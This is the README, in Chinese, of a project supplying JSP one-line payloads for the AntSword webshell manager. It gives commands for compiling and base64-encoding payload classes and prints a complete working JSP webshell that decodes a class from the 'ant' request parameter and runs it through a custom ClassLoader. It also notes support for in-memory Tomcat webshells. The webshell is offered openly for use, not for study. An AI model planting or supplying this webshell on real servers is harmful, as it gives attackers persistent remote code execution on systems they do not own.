## 项目已移动至[蚁剑官方仓库](https://github.com/AntSwordProject/AntSword-JSP-Template)，本项目不再更新。
# JspForAntSword  v1.1
中国蚁剑JSP一句话Payload

详细介绍： https://yzddmr6.tk/posts/antsword-diy-3/

环境： jdk1.6  tomcat7

## 编译

### 手动编译

```
javac -cp "D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar" Test.java

base64 -w 0 Test.class > Test.txt
```

### 自动编译

在build.py中替换你的javac路径跟lib路径后，在当前目录下运行，即可对当前路径下所有.java文件进行编译以及生成base64格式的payload。

```
python3 build.py
```

## Shell

```
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("ant");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

其中`pageContext`可以替换为`request`或者`response`，以实现对Tomcat内存Webshell的兼容

## 更新日志

### v1.1

1. 增加对Tomcat内存Webshell的兼容
2. 兼容高版本JDK（JDK7-14）

### v 1.0

1. release
